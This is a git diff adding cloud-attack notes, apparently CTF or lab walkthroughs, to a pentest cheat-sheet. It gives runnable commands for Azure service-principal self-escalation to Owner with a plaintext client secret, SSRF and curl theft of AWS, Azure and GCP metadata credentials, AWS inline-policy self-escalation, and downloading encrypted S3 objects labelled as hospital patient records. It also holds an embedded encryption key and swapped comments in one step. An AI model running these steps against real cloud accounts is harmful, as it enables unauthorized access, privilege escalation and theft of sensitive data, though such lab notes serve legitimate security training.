@@ -434,7 +434,181 @@ Get-MgApplicationOwner -ApplicationId "84a6fe6a-2642-4832-b0d1-f8e0c4cad633" | C
 ```
 github.com/NetSPI/MicroBurst
 ```
+
+---
 ## Service Principals Permission Paradox
+### Step 1: Discover the Tenant ID
+```url
+https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration
+```
+### Step 2: Authenticate & Gain Entry
+```sh
+az login --service-principal -u 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f -p o8g8Q~jZzIZ-eoCgxSC0CDSsdwJ9pjsTRVEIJdsT --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+### Step 3: Uncover the Service Principal’s Permissions
+```sh
+az role assignment list --assignee 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f --output json --all
+az role assignment list --output json --all
+
+#This command will help the user to get the Role Assignment/permissions assigned to the Service Principal.
+az role definition list --name "secops-testing-mgmt-sp-role" --query "[].{RoleName:roleName, Permissions:permissions}" --output json
+```
+**Key Finding:** If the Service Principal has **Microsoft.Authorization/roleAssignments/write**, it can assign ANY role to itself within the defined scope. This is your **privilege escalation gateway!**
+### Step 4: Privilege Escalation
+```sh
+az role assignment create --assignee 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f --role "Owner" --scope "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/Secops-Testing-rg/providers/Microsoft.Storage/storageAccounts/secopstestingtoolsacc"
+```
+### Step 5: Exfiltrate the Flag!
+```sh
+az storage container list --account-name secopstestingtoolsacc --auth-mode login --output table
+
+az storage blob list --account-name secopstestingtoolsacc --container-name secopstestingtoolscont --auth-mode login --output table
+```
+
+---
+## EC2 Compromise (ssrf aws)
+### 1. Exploiting SSRF to Access EC2 Metadata
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role #выдаст доступы
+```
+### 2. Authorizing IAM Security Credentials
+```sh
+export AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
+export AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
+export AWS_SESSION_TOKEN=<AWS_SESSION_TOKEN>
+aws sts get-caller-identity
+```
+
+---
+## Compute Crack (rce Azure)
+```sh
+curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+```sh
+export AZURE_ACCESS_TOKEN=$(cat token.txt)
+export ARM_TENANT_ID="f2a33211-e46a-4c92-b84d-aff06c2cd13f"
+
+az rest \
+  --method get \
+  --url "https://management.azure.com/subscriptions?api-version=2020-01-01" \
+  --headers "Authorization=Bearer $AZURE_ACCESS_TOKEN"
+```
+
+---
+## Compute Engine Intrusion (rce GCP)
+```sh
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/service-accounts/
+```
+
+---
+## testIamPermissions() Probe
+1. Authenticate to GCP
+```sh
+gcloud auth activate-service-account --key-file <Keyfile>
+```
+2. Craft Your Permission Request
+```json
+{
+  "permissions": [
+    "resourcemanager.projects.get",
+    "resourcemanager.projects.delete",
+    "iam.serviceAccounts.actAs"
+  ]
+}
+```
+3. Exploitation
+```sh
+curl -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" -H "Content-Type: application/json; charset=utf-8" -d @request.json "https://cloudresourcemanager.googleapis.com/v1/projects/woven-acolyte-428406-v9:testIamPermissions"
+
+{
+  "permissions": [
+    "iam.serviceAccounts.actAs"
+  ]
+}
+```
+
+---
+## KeyMaster - Decoding S3 Secrets
+1. Identify User Permissions
+```sh
+aws iam get-user
+aws iam get-user --query "User.PermissionsBoundary" --output text
+
+aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
+aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
+```
+2. Exploiting Misconfigurations
+It turns out that the user has the ability to attach inline policies! This means we can escalate privileges within the allowed scope.
+
+Create a **policy.json** file:
+```
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:*"
+      ],
+      "Resource": [
+        "arn:aws:s3:::securecopbakupbuk1",
+        "arn:aws:s3:::securecopbakupbuk1/*"
+      ]
+    },
+    {
+      "Effect": "Allow",
+      "Action": "kms:*",
+      "Resource": "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5"
+    }
+  ]
+}
+```
+Once we created the **policy.json**, we can assign it to the current user.
+```sh
+aws iam put-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy --policy-document file://policy.json
+```
+Now let’s view whether the permission is assigned or not to the user
+```sh
+aws iam list-attached-user-policies --user-name BackupReader1
+aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/UserPolicy
+aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/UserPolicy --version-id v1
+```
+4. Exploiting S3 and KMS Access
+```sh
+#To list the objects
+aws s3 ls s3://securecopbakupbuk1/
+#To get the object
+aws s3 cp s3://securecopbakupbuk1/key.txt .
+```
+5. Using the KMS Key to Retrieve Encrypted Objects
+```sh
+#To download the Hospital+Patient+Records.zip
+aws s3api get-object --bucket securecopbakupbuk1 --key env.txt ./env9.txt --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
+
+#To download the env.txt
+aws s3api get-object --bucket securecopbakupbuk1 --key Hospital+Patient+Records.zip ./Hospital9.zip --sse-customer-algorithm AES256 --sse-customer-key ZhL8Zvaa3Xybf/sizoGwtrgKpxkxE46JJMiz1syVGQM= --sse-customer-key-md5 ESUzbd203tahLpxvA6LL4g==
+```
+
+---
+## CloudFunction Parody
+1. fuzz for leak configuration.txt
+2. curl to leaked url to invoke the Cloud Function
+```sh
+curl -X POST "https://us-central1-woven-acolyte-428406-v9.cloudfunctions.net/recovery-function?action=token" -H "Content-Type: application/json"  -d '{}'
+```
+4. decode token
+
+---
+## Lambda Escalation
+
+
+
+
+
+
 
 
 
